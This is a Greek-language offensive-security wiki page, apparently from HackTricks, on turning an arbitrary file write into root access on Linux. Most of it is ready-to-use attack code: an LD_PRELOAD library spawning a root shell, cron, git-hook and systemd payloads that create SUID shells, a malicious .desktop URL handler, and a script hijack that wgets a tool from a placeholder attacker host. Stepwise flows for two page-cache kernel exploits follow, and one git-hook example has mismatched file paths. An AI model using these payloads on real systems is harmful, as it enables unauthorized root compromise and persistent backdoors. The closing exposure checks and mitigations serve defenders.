# Αυθαίρετη εγγραφή αρχείου στο Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Αυτό το αρχείο λειτουργεί όπως η μεταβλητή περιβάλλοντος **`LD_PRELOAD`**, αλλά λειτουργεί επίσης σε **SUID binaries**.\
Αν μπορείτε να το δημιουργήσετε ή να το τροποποιήσετε, μπορείτε απλώς να προσθέσετε μια **διαδρομή προς μια library που θα φορτώνεται** με κάθε binary που εκτελείται.

Για παράδειγμα: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) είναι **scripts** που **εκτελούνται** σε διάφορα **events** σε ένα git repository, όπως όταν δημιουργείται ένα commit, ένα merge... Επομένως, αν ένας **privileged script ή user** εκτελεί συχνά αυτές τις ενέργειες και υπάρχει δυνατότητα **εγγραφής στον φάκελο `.git`**, αυτό μπορεί να χρησιμοποιηθεί για **privesc**.

Για παράδειγμα, είναι δυνατό να **δημιουργηθεί ένα script** σε ένα git repo μέσα στο **`.git/hooks`**, ώστε να εκτελείται πάντα όταν δημιουργείται ένα νέο commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Αρχεία Cron & χρόνου

Αν μπορείς να **γράψεις σε αρχεία που σχετίζονται με το cron και εκτελούνται από τον root**, συνήθως μπορείς να επιτύχεις code execution την επόμενη φορά που θα εκτελεστεί η εργασία. Ενδιαφέροντες στόχοι περιλαμβάνουν:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Το crontab του root στο `/var/spool/cron/` ή στο `/var/spool/cron/crontabs/`
- `systemd` timers και τα services που ενεργοποιούν

Γρήγοροι έλεγχοι:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Συνήθεις τρόποι κατάχρησης:

- **Προσθήκη ενός νέου root cron job** στο `/etc/crontab` ή σε ένα αρχείο στο `/etc/cron.d/`
- **Αντικατάσταση ενός script** που εκτελείται ήδη από το `run-parts`
- **Backdoor σε έναν υπάρχοντα timer target** τροποποιώντας το script ή το binary που εκκινεί

Ελάχιστο παράδειγμα cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Αν μπορείτε να γράψετε μόνο μέσα σε έναν κατάλογο cron που χρησιμοποιείται από το `run-parts`, τοποθετήστε εκεί ένα εκτελέσιμο αρχείο:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Σημειώσεις:

- Το `run-parts` συνήθως αγνοεί filenames που περιέχουν τελείες, επομένως προτιμήστε ονόματα όπως `backup` αντί για `backup.sh`.
- Ορισμένες διανομές χρησιμοποιούν `anacron` ή timers του `systemd` αντί για το κλασικό cron, αλλά η ιδέα εκμετάλλευσης είναι η ίδια: **τροποποιήστε αυτό που θα εκτελέσει αργότερα το root**.

### Αρχεία Service & Socket

Αν μπορείτε να γράψετε **`systemd` unit files** ή αρχεία που αναφέρονται από αυτά, ενδέχεται να μπορέσετε να επιτύχετε εκτέλεση κώδικα ως root κάνοντας reload και restart του unit ή περιμένοντας να ενεργοποιηθεί η διαδρομή ενεργοποίησης του service/socket.

Ενδιαφέροντες στόχοι περιλαμβάνουν:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides στο `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries που αναφέρονται από τα `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable paths του `EnvironmentFile=` που φορτώνονται από ένα root service

Γρήγοροι έλεγχοι:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Συνήθεις διαδρομές abuse:

- **Overwrite `ExecStart=`** σε ένα `root`-owned service unit που μπορείς να τροποποιήσεις
- **Add a drop-in override** με ένα malicious `ExecStart=` και πρώτα κάνε clear το παλιό
- **Backdoor το script/binary** που αναφέρεται ήδη από το unit
- **Hijack ένα socket-activated service** τροποποιώντας το αντίστοιχο `.service` file, το οποίο ξεκινά όταν το socket λάβει μια connection

Παράδειγμα malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Τυπική ροή ενεργοποίησης:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Εάν δεν μπορείτε να κάνετε restart στα services μόνοι σας, αλλά μπορείτε να επεξεργαστείτε ένα socket-activated unit, ίσως χρειάζεται απλώς να **περιμένετε μια σύνδεση client** για να ενεργοποιηθεί η εκτέλεση του backdoored service ως root.

### Overwrite ενός restrictive `php.ini` που χρησιμοποιείται από ένα privileged PHP sandbox

Ορισμένα custom daemons επικυρώνουν PHP που παρέχεται από τον χρήστη, εκτελώντας το `php` με ένα **restricted `php.ini`** (για παράδειγμα, `disable_functions=exec,system,...`). Εάν ο sandboxed κώδικας εξακολουθεί να διαθέτει **οποιοδήποτε write primitive** (όπως το `file_put_contents`) και μπορείτε να προσπελάσετε το **ακριβές path του `php.ini`** που χρησιμοποιείται από το daemon, μπορείτε να **overwrite αυτό το config** για να άρετε τους περιορισμούς και στη συνέχεια να υποβάλετε ένα δεύτερο payload που εκτελείται με elevated privileges.

Τυπική ροή:

1. Το πρώτο payload κάνει overwrite το sandbox config.
2. Το δεύτερο payload εκτελεί κώδικα, τώρα που τα dangerous functions έχουν ενεργοποιηθεί ξανά.

Minimal example (αντικαταστήστε το path που χρησιμοποιείται από το daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Εάν ο daemon εκτελείται ως root (ή πραγματοποιεί validation με paths που ανήκουν στον root), η δεύτερη εκτέλεση παρέχει root context. Αυτό αποτελεί ουσιαστικά **privilege escalation μέσω overwrite του config**, όταν το sandboxed runtime εξακολουθεί να μπορεί να γράφει αρχεία.

### binfmt_misc

Το αρχείο που βρίσκεται στο `/proc/sys/fs/binfmt_misc` υποδεικνύει ποιο binary πρέπει να εκτελεί συγκεκριμένους τύπους αρχείων. TODO: ελέγξτε τις απαιτήσεις για την κατάχρησή του, ώστε να εκτελεστεί ένα rev shell όταν ανοίγει ένας κοινός τύπος αρχείου.

### Overwrite schema handlers (όπως http: ή https:)

Ένας attacker με write permissions στους configuration directories ενός victim μπορεί εύκολα να αντικαταστήσει ή να δημιουργήσει αρχεία που αλλάζουν τη συμπεριφορά του συστήματος, με αποτέλεσμα μη αναμενόμενη code execution. Τροποποιώντας το αρχείο `$HOME/.config/mimeapps.list`, ώστε οι HTTP και HTTPS URL handlers να δείχνουν σε ένα malicious αρχείο (π.χ. ορίζοντας `x-scheme-handler/http=evil.desktop`), ο attacker εξασφαλίζει ότι **κάθε click σε σύνδεσμο http ή https ενεργοποιεί τον κώδικα που καθορίζεται στο συγκεκριμένο αρχείο `evil.desktop`**. Για παράδειγμα, αφού τοποθετηθεί ο παρακάτω malicious κώδικας στο `evil.desktop` μέσα στο `$HOME/.local/share/applications`, κάθε εξωτερικό URL click εκτελεί την embedded εντολή:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Για περισσότερες πληροφορίες, δείτε [**αυτήν την ανάρτηση**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), όπου χρησιμοποιήθηκε για την εκμετάλλευση ενός πραγματικού vulnerability.

### Root executing user-writable scripts/binaries

Αν ένα privileged workflow εκτελεί κάτι όπως `/bin/sh /home/username/.../script` (ή οποιοδήποτε binary μέσα σε έναν κατάλογο που ανήκει σε unprivileged user), μπορείτε να το hijack:

- **Εντοπισμός της εκτέλεσης:** παρακολουθήστε τις διεργασίες με το [pspy](https://github.com/DominicBreuker/pspy), ώστε να εντοπίσετε το root να καλεί paths που ελέγχονται από τον user:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** βεβαιώσου ότι τόσο το target file όσο και ο κατάλογός του ανήκουν στον χρήστη σου και είναι writable.
- **Hijack the target:** κράτησε backup του original binary/script και τοποθέτησε ένα payload που δημιουργεί ένα SUID shell (ή οποιαδήποτε άλλη ενέργεια ως root) και, στη συνέχεια, επανάφερε τα permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (π.χ. πατώντας ένα UI button που κάνει spawn τον helper). Όταν το root επανεκτελέσει το hijacked path, πάρτε το escalated shell με `./rootshell -p`.

### Τροποποίηση privileged binaries μόνο στο page cache

Ορισμένα kernel bugs δεν τροποποιούν το αρχείο **στο disk**. Αντίθετα, σας επιτρέπουν να τροποποιήσετε μόνο το **αντίγραφο στο page cache** ενός readable αρχείου. Αν μπορείτε να στοχεύσετε ένα **setuid** ή διαφορετικά **root-executed** binary, η επόμενη εκτέλεση μπορεί να εκτελέσει attacker-controlled bytes από τη μνήμη και να κάνει escalate privileges, παρόλο που το file hash στο disk παραμένει αμετάβλητο.

Αυτό είναι χρήσιμο να το βλέπετε ως ένα **runtime-only file write primitive**:

- **Το disk παραμένει καθαρό**: το inode και τα bytes στο disk δεν αλλάζουν
- **Η μνήμη είναι dirty**: οι processes που διαβάζουν/εκτελούν τη cached page λαμβάνουν το τροποποιημένο από τον attacker περιεχόμενο
- **Το effect είναι προσωρινό**: η αλλαγή εξαφανίζεται μετά από reboot ή cache eviction

Αυτό το primitive βρίσκεται ανάμεσα στο κλασικό **arbitrary file write** και σε παλαιότερα **page-cache abuse** bugs, όπως τα Dirty COW / Dirty Pipe:

- Το Dirty COW βασιζόταν σε race
- Το Dirty Pipe είχε περιορισμούς στη write position
- Ένα page-cache-only primitive μπορεί να είναι πιο reliable αν το vulnerable path παρέχει direct writes σε cached file-backed pages

#### Generic privesc flow

1. Αποκτήστε ένα kernel primitive που μπορεί να γράψει σε **file-backed page cache pages**
2. Χρησιμοποιήστε το εναντίον ενός **readable privileged binary** ή άλλου root-executed αρχείου
3. Κάντε trigger την εκτέλεση **πριν** γίνει eviction της page από το cache
4. Αποκτήστε code execution ως root, ενώ το αρχείο στο disk εξακολουθεί να φαίνεται μη τροποποιημένο

Τυπικοί high-value στόχοι:

- **setuid-root** binaries
- Helpers που εκκινούνται από **root services**
- Binaries που εκτελούνται συχνά από **containers που μοιράζονται το host kernel/page cache**

#### AF_ALG + `splice()` example path

Το Copy Fail (CVE-2026-31431) είναι ένα καλό παράδειγμα αυτής της κατηγορίας. Το vulnerable path βρισκόταν στο Linux crypto userspace API (`AF_ALG` / `algif_aead`):

- Το `splice()` μπορεί να μετακινήσει references σε page-cache pages από ένα readable αρχείο στο crypto TX scatterlist
- Το in-place `algif_aead` decrypt path επαναχρησιμοποιούσε τα source και destination buffers
- Το `authencesn` έγραφε στη destination tag region
- όταν αυτή η region εξακολουθούσε να αναφέρεται σε spliced file-backed pages, η εγγραφή κατέληγε στο **page cache του target αρχείου**

Επομένως, η ενδιαφέρουσα technique δεν είναι το ίδιο το CVE, αλλά το pattern:

- **τροφοδοτήστε file-backed cache pages σε ένα kernel subsystem**
- κάντε το subsystem να **τις αντιμετωπίσει ως writable output**
- κάντε trigger ένα μικρό, controlled overwrite στη μνήμη

Το public PoC χρησιμοποιούσε επαναλαμβανόμενα **4-byte writes** για να κάνει patch το `/usr/bin/su` στη μνήμη και στη συνέχεια το εκτελούσε.

#### ESP / XFRM + netfilter TEE clone example path

Το DirtyClone (CVE-2026-43503) παρουσιάζει μια ακόμη παραλλαγή του ίδιου **page-cache-only write-to-root** pattern, αλλά αυτή τη φορά το sink είναι το **IPsec ESP decrypt** αντί για το `AF_ALG`.

Η σημαντική technique είναι το **metadata-laundering step**:

- Το `splice()` τοποθετεί ένα **read-only file-backed page-cache page** σε ένα ESP-in-UDP packet
- Το αρχικό DirtyFrag mitigation έκανε tag το skb με `SKBFL_SHARED_FRAG`, ώστε το `esp_input()` να κάνει **copy πριν από το decrypt**
- Το netfilter `TEE` κάνει duplicate το packet μέσω των `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- Το clone διατηρεί το **ίδιο physical page-cache reference**, αλλά χάνει το `SKBFL_SHARED_FRAG`
- Το `esp_input()` θεωρεί τότε το clone safe και εκτελεί **in-place `cbc(aes)` decrypt** πάνω στη file-backed page

Επομένως, το lesson για τον reviewer είναι ευρύτερο από το CVE: αν ένα mitigation βασίζεται σε **skb/page metadata** για να αποφασίσει αν μια operation πρέπει πρώτα να κάνει copy, οποιοδήποτε **clone/copy path διατηρεί την backing page αλλά απορρίπτει το metadata** μπορεί αθόρυβα να ανοίξει ξανά το write primitive.

Τυπικό exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` για να αποκτήσετε **`CAP_NET_ADMIN` μέσα σε ένα private network namespace**
2. Κάντε bring το loopback up και εγκαταστήστε έναν **netfilter `TEE` rule** στο `mangle/OUTPUT`
3. Εγκαταστήστε **XFRM ESP transport SAs** μέσω `NETLINK_XFRM`
4. Κωδικοποιήστε κάθε target 4-byte word στο πεδίο `seq_hi` του SA (το word-selection trick του DirtyFrag)
5. Στείλτε το spliced ESP-in-UDP packet, ώστε το **TEE clone** να φτάσει στο `esp_input()` και να κάνει decrypt **in place**
6. Επαναλάβετε μέχρι το page-cache copy του `/usr/bin/su` ή κάποιου άλλου privileged executable να περιέχει attacker-controlled code

Από operational άποψη, το impact είναι ίδιο με το παράδειγμα `AF_ALG`: το αρχείο στο disk παραμένει καθαρό, αλλά το `execve()` καταναλώνει τα **mutated page-cache bytes** και παρέχει root.

Χρήσιμοι exposure checks για αυτή την παραλλαγή:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Η βραχυπρόθεσμη μείωση του attack surface είναι και εδώ path-specific: η αναβάθμιση σε kernel που περιλαμβάνει το `48f6a5356a33` διορθώνει το clone path, ενώ ο αποκλεισμός του autoload του `xt_TEE` αφαιρεί το **flag-laundering step** και ο αποκλεισμός των `esp4` / `esp6` αφαιρεί το **decrypt sink**.

#### Exposure και hunting

Αν υποψιάζεστε αυτή την κατηγορία bug, μην βασίζεστε μόνο σε disk integrity checks. Επαληθεύστε επίσης:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: το `algif_aead` μπορεί να φορτωθεί ή να εκφορτωθεί ως module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: το interface είναι ενσωματωμένο στον kernel
- τα setuid binaries είναι καλοί στόχοι, επειδή ένα patch που αφορά μόνο το page cache μπορεί να αρκεί για τη μετατροπή ενός local foothold σε root

#### Μείωση της attack surface για το path `algif_aead`

Αν το vulnerable interface παρέχεται από loadable module:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Εάν έχει μεταγλωττιστεί στον kernel, αναφέρθηκαν ορισμένες αποκαλύψεις που μπλοκάρουν το init path με:
```bash
initcall_blacklist=algif_aead_init
```
Αυτό το είδος mitigation αξίζει να το θυμάστε και για άλλα kernel LPE: αν το exploitation εξαρτάται από ένα συγκεκριμένο προαιρετικό interface, η απενεργοποίηση ή το blacklisting αυτού του interface μπορεί να διακόψει το exploit path ακόμη και πριν καταστεί διαθέσιμο ένα πλήρες kernel upgrade.

## Αναφορές

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog: Dissecting and Exploiting Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
